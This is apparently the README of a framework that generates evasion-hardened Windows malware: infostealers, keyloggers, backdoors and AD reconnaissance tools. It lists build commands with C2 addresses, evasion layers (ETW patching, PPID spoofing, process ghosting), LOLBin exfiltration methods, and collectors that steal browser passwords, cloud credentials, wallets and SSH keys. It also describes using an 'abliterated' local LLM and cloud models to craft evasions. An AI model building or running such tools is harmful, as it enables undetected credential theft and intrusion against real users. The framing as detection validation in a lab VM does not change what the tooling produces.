# Malware Generation Framework

Automated malware generation, evasion testing, and detection validation against live Windows VMs with real EDR products. Two complementary engines:

1. **Chunk Assembler** — deterministic, recipe-based. 130 pre-written C chunks assembled into complete malware, with a 12-layer evasion selector and 5 strategy archetypes per type. 358M base evasion combinations × type-specific multipliers. Binary in ~5 seconds.
2. **Malgen Skill** — LLM-driven (Claude/local). Generates evasion-hardened code from scratch. Used for novel technique discovery when the chunk matrix hits a wall.

Validated against a full detection stack: Windows Defender + Wazuh SIEM + Sysmon + 3,009 Sigma rules (via Chainsaw). All malware types pass with zero detections.

---

## Quick Start

```bash
# Web portal (recommended)
python -m malware_gen_framework portal
# Open http://localhost:7070

# Chunk assembler — build from recipe
python3 templates/chunks/assembler.py templates/chunks/recipes/infostealer_full.yaml \
    -o /tmp/payload.c --var C2_IP=10.0.2.2 --var C2_PORT=9001

# Hybrid evasion loop — auto-iterate until undetected
MALGEN_ACTIVE_EDRS=defender,wazuh,sysmon \
python3 templates/chunks/evasion_selector.py --run infostealer

# LLM-driven pipeline (malgen skill)
python -m malware_gen_framework run --spec spec.yaml --output results --loop

# EDR behavioral score (models CrowdStrike Falcon)
./scripts/edr_score.sh payload.exe --type infostealer
```

### Prerequisites

| Dependency | Purpose |
|---|---|
| `x86_64-w64-mingw32-gcc` | Cross-compilation for Windows targets |
| QEMU/KVM + OVMF + `swtpm` | VM provisioning (Windows 11, TPM 2.0) |
| Python 3.12+ | `asyncssh`, `chromadb`, `pydantic`, `jinja2`, `flask` |
| Chainsaw v2.16.0 | Sigma rule engine (in `tools/chainsaw/`) |
| Sigma rules | 3,009 rules (in `tools/sigma/`) |
| Wazuh | Manager on host + agent on VM |
| Sysmon | Installed on VM |
| Local LLM (optional) | For Tier 2 evasion (port 11235) |

---

## Architecture

### Chunk Assembler Pipeline

```
  Recipe YAML                    12-Layer Evasion Selector
  (54 pre-built)                 (358M base × type-specific multipliers)
       |                                |
       v                                v
  +------------+    +------------------------------------------+
  | assembler  |    | evasion_selector.py                      |
  |   .py      |    |                                          |
  | YAML ->    |    | Tier 1: Algorithmic  (fast, free)        |
  | single .c  |    | Tier 2: Local LLM   (creative, cheap)   |
  | file       |    | Tier 3: Cloud LLM   (novel, expensive)  |
  +-----+------+    |                                          |
        |           | For each combination:                    |
        v           |   assemble -> obfuscate -> compile ->    |
  +----------+      |   deploy -> execute -> check Defender -> |
  | obfuscate|      |   check Wazuh -> check Sigma (3,009) -> |
  | (poly    |      |   SUCCESS or try next combination        |
  |  mutate) |      +------------------------------------------+
  +-----+----+
        |
        v
  +----------+      +------------------+
  | compile  | ---> | deploy to VM     |
  | (MinGW)  |      | (SSH + schtasks) |
  +----------+      +--------+---------+
                             |
                             v
                    +------------------+
                    | validate:        |
                    | - Defender       |
                    | - Wazuh alerts   |
                    | - Sigma rules    |
                    | - C2 data recv   |
                    +------------------+
```

### Malgen Skill Pipeline (LLM-Driven)

```
  spec.yaml -> ChromaDB queries -> LLM planning -> chunk generation
    -> assembly -> evasion passes -> compile -> deploy -> verify
    -> detection feedback -> re-generate (loop)
```

---

## Chunk Assembler

The primary engine. 130 pre-written, hand-verified C source chunks across 14 categories, wired together by recipe YAML files.

### Chunk Categories

| Category | Count | Purpose |
|---|---|---|
| `collectors/` | 30 | Data collection (system info, browser, credentials, screenshots, ...) |
| `commands/` | 13 | Backdoor command handlers (API + LOLBin variants) |
| `evasion/` | 24 | Evasion techniques (ETW patch, indirect syscall, sleep obfuscation, module stomp, ...) |
| `exfil/` | 18 | Exfiltration (TCP, HTTP, HTTPS, DNS, SMB, LOLBin pipes, named pipe) |
| `arch/` | 18 | Execution architecture (sequential, threaded, fiber, callback, backdoor) |
| `process/` | 7 | Process lineage (PPID spoof × 6 parents, process ghosting) |
| `c2/` | 2 | C2 transport (TCP beacon, WinHTTP beacon) |
| `persist/` | 3 | Persistence (registry, schtask, startup folder) |
| `api_resolve/` | 3 | API resolution (DJB2 hash, FNV-1a hash, PEB walk) |
| `ad/` + `ad_collectors/` | 9 | Active Directory reconnaissance (LDAP-based) |
| `core/` | 3 | Shared utilities (emit_buffer, run_cmd, file_ops) |

### Evasion Layers

The evasion selector explores combinations across 12 independent layers:

| Layer | Options | Examples |
|---|---|---|
| **api_resolve** | 7 | direct_import, api_hash_djb2, api_hash_fnv1a, api_hash_crc32, peb_walk, indirect_syscall, loadlibrary |
| **execution** | 10 | sequential, threaded, fiber, callback_abuse, callback_enumwindows, callback_certenumsystem, callback_copyfile2, callback_enumrestype, apc_self, staged |
| **process** | 10 | standalone, ppid_spoof (explorer/svchost/RuntimeBroker/sihost/taskhostw/dllhost), dll_sideload, process_hollow, process_ghost |
| **timing** | 5 | immediate, staged_jitter, deferred, triggered, workday |
| **data_obfuscation** | 4 | plaintext, xor_encrypt, stack_strings, aes_encrypt |
| **anti_analysis** | 5 | none, anti_debug, anti_vm, anti_sandbox, full |
| **etw_method** | 4 | none, memory-patch EtwEventWrite, hwbp EtwEventWrite, hwbp ETW+AMSI (patchless) |
| **memory_residence** | 2 | native (EXE .text), module_stomp (signed DLL .text — image-backed to VAD scanner) |
| **stack_presentation** | 2 | honest (real return addresses), ret_spoof (return addresses in legitimate DLLs) |
| **sleep_mode** | 4 | basic, jitter, XOR-encrypt buffers, Ekko ROP (encrypt + PAGE_NOACCESS during sleep) |
| **exfil** | 16 | tcp_direct, http_post, https_post, winhttp_get, winhttp_api, dns_exfil, dns_txt, smb_write, certutil, bitsadmin, powershell, cscript, mshta, curl (LOLBins), http_get_chunks, named_pipe |
| **persistence** | 5 | none, registry_run, scheduled_task, startup_folder, service |

**Base evasion: 7 × 10 × 10 × 5 × 4 × 5 × 4 × 2 × 2 × 4 × 16 × 5 = 358,400,000 combinations**

Per-type totals (base × type-specific multipliers):

| Type | Multiplier | Total Variants |
|---|---|---|
| **Infostealer** | 30 collectors (6 with LOLBin/API variants, each on/off) | **~58.7 quadrillion** |
| **Backdoor** | 2 C2 transports × 13 cmd handlers (5 with LOLBin/API variants) | **~5.9 trillion** |
| **AD Recon** | 63 collector subsets (6 modules, any non-empty combination) | **~1.3 trillion** |
| **Keylogger** | 2 capture methods (polling, hook) | **~8.6 billion** |

### Recipes

54 pre-built recipes across 4 malware types:

| Type | Recipes | Description |
|---|---|---|
| **Infostealer** | 8 | System info, browsers, credentials, screenshots, cloud creds, crypto wallets, SSH keys |
| **Backdoor** | 17 | Bidirectional C2 (TLV protocol), 13 command handlers, API + LOLBin variants |
| **Keylogger** | 16 | GetAsyncKeyState polling, LOLBin/API exfil options, clipboard capture |
| **AD Recon** | 3 | LDAP-based reconnaissance (users, groups, computers, OUs, GPOs) |

### Hybrid Evasion Loop

The evasion selector runs a tiered loop:

```
Tier 1: Strategy Archetypes (5 runs) — each run is a fundamentally different evasion
                                        strategy, not a tweak of the last one. 5 pre-ranked
                                        strategies per malware type, ordered by success
                                        probability. Maximum behavioral variance between runs.
Tier 2: Local LLM (3 runs)          — local model reads detection output and picks
                                        targeted layer changes.
Tier 3: Cloud LLM (2 runs)          — cloud model for novel approaches.
```

Each run: assemble -> obfuscate -> compile -> deploy -> execute -> validate against full detection stack. First success exits. Progress bars show real-time tier status.

Source-level obfuscation pipeline (applied before compilation):
- Polymorphic variable renaming + junk code blocks
- Control-flow junk insertion (opaque predicates + dead API branches)
- String literal XOR encryption with per-build random keys
- API call obfuscation (optional, heavy/max levels)

Post-compile transforms applied to every binary:
- PE timestamp stomping (random date 2020-2023)
- Section name randomization (defeats `.text`/`.data` YARA rules)

---

## Detection Stack

All binaries are validated against a layered detection system:

| Layer | What It Catches | Integration |
|---|---|---|
| **Windows Defender** | Signature + ML heuristic + cloud lookup | Real-time, fully enabled on VM |
| **Wazuh SIEM** | Behavioral rules, alert correlation | Agent on VM, indexer on host (port 9201) |
| **Sysmon** | Process creation, network, file, registry telemetry | Full config on VM |
| **Sigma Rules** (3,009) | Behavioral detection patterns | Chainsaw scans exported Sysmon EVTX |

Sigma rule breakdown:
- 2,401 SigmaHQ Windows rules
- 140 threat-hunting rules
- 462 emerging-threats rules
- 6 custom rules

The `edr_score.sh` script models **CrowdStrike Falcon behavioral detection** — filtering test harness noise, scoring payload-specific detections by severity (critical/high = blocked, medium = alert, low = telemetry).

### Detection Feedback Loop

When detection occurs, the framework captures specific details:

```
Run 3: Sigma detects "Suspicious Schtasks From Temp" (medium)
  -> evasion_selector avoids schtasks-based triggers
  -> swaps to callback_enumwindows execution + startup_folder persistence
Run 4: 0 detections, 54,940 bytes exfiltrated -> SUCCESS
```

---

## Malware Types

### Infostealer

Collects and exfiltrates system data via C2:
- System info, running processes, installed software, environment variables
- Browser data (Chromium cookies, passwords, history)
- Screenshots (BMP via GDI)
- Cloud credentials (AWS, Azure, GCP config files)
- Crypto wallets, Discord tokens, Telegram sessions
- SSH keys, FTP credentials, recent files

25+ collector chunks, each independently swappable.

### Keylogger

Persistent keystroke capture with exfiltration:
- `GetAsyncKeyState` polling (10ms intervals)
- Clipboard monitoring
- Active window tracking
- Multiple exfil options: TCP, HTTP, DNS, LOLBin pipes (certutil, cscript, mshta, powershell)
- Self-test: injects marker keystrokes to validate the full capture pipeline

### Backdoor

Bidirectional C2 with TLV (Type-Length-Value) protocol:
- Transport: raw TCP beacon or WinHTTP beacon (looks like web traffic)
- 13 command handlers with API and LOLBin variants:
  - `cmd_sysinfo` / `cmd_sysinfo_lolbin` — system information
  - `cmd_processes` / `cmd_processes_lolbin` — process listing
  - `cmd_filelist`, `cmd_fileread`, `cmd_filewrite` — file operations
  - `cmd_screenshot` — screen capture
  - `cmd_registry` — registry enumeration
  - `cmd_netinfo` / `cmd_netinfo_lolbin` — network info
  - `cmd_exec` / `cmd_exec_powershell` — command execution
- Reconnect with jitter (30-120s)
- Staged variant: initial recon + exfil before entering beacon loop

### AD Recon

LDAP-based Active Directory reconnaissance:
- Users, groups, computers, OUs, GPOs
- SID resolution, JSON builder for structured output
- 3 recipes: default, stealth (minimal queries), DC-only

---

## VM Environment

### Windows 11 VM

```
Windows ISO -> autounattend.xml -> FAT12 ISO -> QEMU boot
  -> Unattended install (~13 min)
  -> SSH ready (port 10022, vmuser/vmuser123)
  -> Clean-state snapshot via blockdev-snapshot-sync
```

- QEMU/KVM with OVMF/UEFI + TPM 2.0 (`swtpm`)
- `blockdev-snapshot-sync` overlays for fast VM resets (never `savevm`/`loadvm`)
- Defender fully enabled (AMService + RealTimeProtection + Antivirus)
- Sysmon with full telemetry config
- Wazuh agent reporting to host

### EDR Management

Live toggle via SSH from web portal or CLI:

```bash
# Toggle individual EDRs
curl -X POST localhost:7070/api/edr/manage/toggle \
    -d '{"component": "defender", "enable": false}'

# Presets
curl -X POST localhost:7070/api/edr/manage/preset \
    -d '{"preset": "defender-only"}'
# Presets: all, defender-only, wazuh-only, none
```

---

## Web Portal

`python -m malware_gen_framework portal` launches on port 7070.

### Chunk Tab
- Recipe selection from 54 pre-built recipes
- Per-layer evasion customization (12 layers, dropdowns)
- Live EDR toggle switches (Defender/Sysmon/Wazuh)
- Hybrid evasion loop with per-tier progress bars
- Real-time compilation and detection output

### EDR Tab
- EDR management: toggle switches + presets (All On / Defender Only / All Off)
- Chainsaw + Sigma scoring: upload binary, get CrowdStrike-equivalent behavioral score
- Detection breakdown by severity with triggered rule details

### Malgen Tab
- LLM-driven generation from spec.yaml
- Full pipeline control (generate/provision/verify/loop)
- Detection feedback loop visualization

---

## Scripts

| Script | Purpose |
|---|---|
| `edr_score.sh` | Chainsaw + 3,009 Sigma rules scoring (models CrowdStrike Falcon) |
| `c2_backdoor.py` | Backdoor C2 controller: `--interactive` (REPL) or `--test-sequence` (automated validation) |
| `deploy_keylogger.sh` | Automated keylogger deployment (upload, RDP setup, schtasks, C2 capture, validation) |
| `deploy_backdoor.sh` | Automated backdoor deployment with C2 test sequence |
| `deploy_ad_recon.sh` | AD recon deployment against Samba AD domain controller |
| `vm_snapshot.sh` | QMP-based VM snapshot management (`save`/`restore`/`list`) |
| `parse_exfil.py` | Parse raw C2 exfil blob into individual files (text, screenshots, databases) |
| `validate_result.py` | Post-run validation of exfiltrated data |

---

## Compilation

All binaries compiled with:

```bash
x86_64-w64-mingw32-gcc -mwindows -o payload.exe source.c \
    -lws2_32 -liphlpapi -lcrypt32 -lole32 -lshell32 -lgdi32 \
    -lwininet -lwinhttp -ldnsapi -ladvapi32 -luser32 \
    -lwldap32 -lnetapi32 -lmpr -static -s -Wl,--strip-all
```

- `-mwindows` + `FreeConsole()` — no visible console window
- `-static` — no DLL dependencies
- `-s -Wl,--strip-all` — strip symbols

---

## LLM Integration

### Tier 2: Local LLM

Blackwell 2 server at `http://localhost:11235` running `huihui-qwen3.6-35b-a3b-claude-4.7-opus-abliterated-mtp@q4_k`. Used for creative evasion layer selection in Tier 2 of the hybrid loop.

### Tier 3: Cloud LLM

Fugu (api.sakana.ai) and OpenRouter. Used sparingly for novel approaches when local LLM exhausts options.

### Knowledge Base

Three ChromaDB vector databases:

| Database | Collection | Docs |
|---|---|---|
| `malware_corpus/data/chroma` | `malware_techniques` | 23,981 |
| `malware_corpus/data/poc_chroma` | `poc_exploits` | 30,380 |
| `hermes_qwen_cti/data/chroma` | `cti_intel` | CTI reports |

---

## Validation Results

Latest full validation (all EDRs enabled):

| Type | C2 Data | Defender | Wazuh | Sigma (3,009 rules) | Binary Size |
|---|---|---|---|---|---|
| Infostealer | 54,940 bytes | 0 detections | 0 high alerts | 0 medium+ hits | ~65 KB |
| Keylogger | 156 bytes | 0 detections | 0 high alerts | 0 medium+ hits | ~49 KB |
| Backdoor | 12 bytes | 0 detections | 0 high alerts | 0 medium+ hits | ~55 KB |

---

## Output

Results are packaged in `results/chunk_<type>_<timestamp>/`:

```
results/chunk_infostealer_20260707_120000/
  payload.exe        # Compiled binary
  source.c           # Obfuscated C source
  recipe.yaml        # Recipe used
  build_info.txt     # Metadata (type, obfuscation, size, test result)
  parse_exfil.py     # Parses exfil .bin into individual files
  deploy.sh          # Deployment script
  exfil_*.bin        # C2 capture data (when tested)
```

`results/latest` symlinks to the most recent package.

---

## Configuration

### spec.yaml

```yaml
os_platform: windows
os_version: windows-11
malware_type: infostealer    # infostealer | keylogger | backdoor | ad_recon
source_language: c
output_format: exe

c2_address: "10.0.2.2"      # QEMU host IP (user-mode networking)
c2_port: 9001

edrs:
  - defender
  - wazuh
  - sysmon
```

### Environment Variables

| Variable | Purpose | Default |
|---|---|---|
| `MALGEN_ACTIVE_EDRS` | Comma-separated active EDR list | `defender` |
| `MALGEN_OBFUSCATION` | Obfuscation level (`none`/`light`/`heavy`) | `heavy` |
| `VM_PORT` | VM SSH port | `10022` |
| `VM_USER` | VM SSH username | `vmuser` |
| `VM_PASS` | VM SSH password | `vmuser123` |
| `C2_PORT` | C2 listener port | `9001` |
